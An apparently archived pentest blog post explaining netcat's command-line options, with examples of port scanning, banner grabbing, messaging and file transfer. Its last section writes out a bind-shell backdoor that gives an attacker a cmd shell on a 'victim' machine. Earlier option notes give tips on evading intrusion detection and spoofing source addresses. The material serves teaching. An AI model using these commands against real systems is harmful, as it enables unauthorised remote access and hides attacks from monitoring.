---
layout: post
title: "NETCAT - TCP/IP SWISS ARMY KNIFE"
date: 2020-12-01T22:25:00+05:30
categories: ["Pentest Engagement"]
description: "Netcat is a utility that is able to write and read data across TCP and UDP network connections. It is widely used by network or system analysts. Netcat can be used as port scanner,"
original_url: "https://blog.alphathreat.in/index.php?post/2020/12/01/NETCAT-The-Swiss-Army-Knife"
---

Netcat is a utility that is able to write and read data across TCP and UDP network connections. It is widely used by network or system analysts. Netcat can be used as port scanner, a backdoor, a port redirector, a port listener and lots of other things.

### **NETCAT COMMAND LINE**

The basic command line for Netcat is nc [options] host ports, where host is the hostname or IP address to scan and ports is either a single port, a port range (specified “m-n”), or individual ports separated by spaces.
But first let us know bout its commmand line options:

**-d**
Available on Windows only, this option puts Netcat in stealth mode, without having to keep command window open.

**-e &lt;command&gt;**
If Netcat was compiled with the GAPING_SECURITY_HOLE option, a listening Netcat will execute any time someone makes a connection on the port to which it is listening, while a client Netcat will pipe the I/O to an instance of Netcat listening elsewhere. This option is extremely dangerous if u don't know what ur doing.

**-i &lt;seconds&gt;**
The delay interval, which is the amount of time Netcat waits between data sends. For example, when piping a file to Netcat, Netcat will wait seconds before transmitting the next line of the input. When you’re using Netcat to operate on multiple ports on a host, Netcat waits seconds before contacting the next port in line. This can allow users to make a data transmission or an attack on a service look less scripted, and it can keep your port scans under the radar of some intrusion-detection systems and system administrators.

**-g &lt;route-list&gt;**
Using this option can be tricky. Netcat supports loose source routing. You can specify up to eight –g options on the command line to force your Netcat traffic to pass through certain IP addresses, which is useful if you’re spoofing the source IP address of your traffic and you want to receive a response from the host. By source routing through a machine over which you have control, you can force the packets to return to your host address instead of heading for the real destination.

**-l**
This option toggles Netcat’s “listen” mode. This option must be used in conjunction with the –p option to tell Netcat to bind to whatever TCP port you specify and wait for incoming connections. Add the –u option to use UDP ports instead.

**-L**
Windows only version, is a stronger “listen” option than -l. It tells Netcat to restart its listen mode with the same command-line options after a connection is closed. Like –l, it requires the –p option.

**-n**
Tells Netcat not to do any hostname lookups at all. If you use this option on the command line, be sure not to specify any hostnames as arguments.

**-o &lt;hexfile&gt;**
Performs a hex dump on the data and stores it in hexfile.

**-p &lt;port&gt;**
Lets you specify the local port number Netcat should use. This argument is required when using the –l or –L option to use listen mode.

**-r**
Netcat chooses random local and remote ports. This is useful if you’re using Netcat to obtain information on a large range of ports on the system and you want to mix up the order of both the source and destination ports to make it look less like a port scan. When this option is used in conjunction with the –i option and a large enough interval, a port scan has an even better chance of going unnoticed.

**-s**
Specifies the source IP address Netcat should use when making its connections. This option allows hackers to do some pretty sneaky tricks. First, it allows them to hide their IP addresses or forge someone else’s, but to get any information routed to their spoofed address, they’d need to use the –g source routing option.

**-u**
Tells Netcat to use UDP instead of TCP. Works for both client mode and listen mode.

**-v**
Verbose mode.

**-w &lt;seconds&gt;**
Controls how long Netcat waits before giving up on a connection.

**-z**
This option tells Netcat to send only enough data to discover which ports in your specified range actually have something listening on them.

### **PORT SCANNING WITH NETCAT**

**"nc -v -w 2 -z target 1-200"
-v :** Verbose Mode will display details on the screen
**-w 2:** Netcat waits 2 seconds before giving up on a connection
**-z:** Prevents sending any data to a TCP connection and very limited probe data to a UDP connection, and is thus useful as a fast scanning mode just to see what ports the target is listening on
**target:** Replace this with your target IP
**1-200:** are the ports to scan

<p class="img-missing" role="note"><strong>Screenshot unavailable</strong> — <code>port.png</code> was not captured by the Internet Archive.</p>

### **BANNER GRABBING**

If we want to know whats running behind port 80 and 21, which we know are the default ports for HTTP and FTP servers respectively.

<p class="img-missing" role="note"><strong>Screenshot unavailable</strong> — <code>banner.png</code> was not captured by the Internet Archive.</p>

<p class="img-missing" role="note"><strong>Screenshot unavailable</strong> — <code>banner1.png</code> was not captured by the Internet Archive.</p>

So we know it’s probably a Windows 2000 machine as it's running IIS 5.0 and Microsoft FTP Service.

### **NETCAT MESSENGER**

On first machine(Listener) which has IP suppose 192.168.56.1
**"nc -v -l -p 1234"**
OR
**"nc -vlp 1234"**

which can be briefed as : netcat -verbosely -listen on -port 1234

On second machine

**nc 192.168.56.1 1234**

This will connect the two netcat instances and messages can be sent to one another by simply typing.

### **FILE TRANSFER**

On first machine(Listener/Sender) which has IP suppose 192.168.56.1
**"nc -v -l -p 1234 &lt; IMPORTANTFILE.txt"**
OR
**"nc -vlp 1234 &lt; IMPORTANTFILE.txt"**

On second machine (Receiver)
**nc 192.168.56.1 1234 &gt; IMPORTANTFILE.txt**

### **NETCAT AS BACKDOOR**

On first machine(Listener/Victim) which has IP suppose 192.168.56.1
**"nc -v -L -p 1234 -e cmd.exe"**
OR
**"nc -vLp 1234 -e cmd.exe**

It can be understand as netcat -Listen hard verbosely on -port 1234 and on successful connection -execute cmd.exe. This will give a cmd shell to the attacker.

On second machine (Attacker)
**nc 192.168.56.1 1234**
